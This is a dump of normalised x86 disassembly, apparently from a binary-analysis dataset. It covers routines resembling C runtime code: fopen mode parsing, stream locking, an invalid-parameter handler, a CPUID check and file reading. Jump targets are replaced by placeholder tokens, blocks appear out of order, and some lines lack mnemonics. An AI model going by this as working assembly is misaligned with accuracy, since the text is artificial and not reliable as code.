mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_20065d3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_2005816
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_2006614
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_2005816
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_2006646
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_200573c
pop ecx
pop ebp
retn
sub_2006682
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_200573c
pop ecx
pop ebp
retn
sub_20066b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_200c6ef
add esp 0x14
test eax eax
je r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_200c879
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_2004f2f
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_2004f2f
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_2004f2f
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_200697a
push 0x10
push r--data
call sub_2006310
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2006aa9
mov eax edi
call sub_2006355
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_200ba1e
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_200b9b6
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_200368f
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_2006614
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_2005753
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_2006682
pop ecx
pop ecx
sub_2006ac1
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_20039e0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_200ba16
pop ecx
sub_2006be9
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_2008528
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_200ba16
pop ecx
pop ebp
jmp sub_2006ac1
pop ebp
jmp eax
sub_2006c10
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_2006ca0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_200c9a9
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_200c9c8
jmp r-xdata
sub_2006ca0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_2003680
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_2006c10
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_2006d02
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_2006d32
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_2006d63
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_2006dba
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_2006dba
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_2006d63
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_2006e99
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_2006e49
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_2006f08
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_2005621
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_200c9cb
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_20076f2
pop ecx
push eax
call sub_20075f5
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_20076f2
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_20076f2
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_20076f2
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_20076f2
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_2007033
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_2005634
mov [ eax ] ebx
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_2005634
mov [ eax ] ebx
call sub_2005621
mov [ eax ] 0x9
jmp r-xdata
call sub_2005634
mov [ eax ] ebx
call sub_2005621
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_200ba1e
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_200ca14
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_2005621
mov [ eax ] 0xc
call sub_2005634
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_2005647
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_200368f
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_2005621
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_200ca14
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_200ca14
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_200ca14
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_20075f5
push 0x10
push r--data
call sub_2006310
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] esi
call sub_2005621
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_2006355
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_200cd30
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
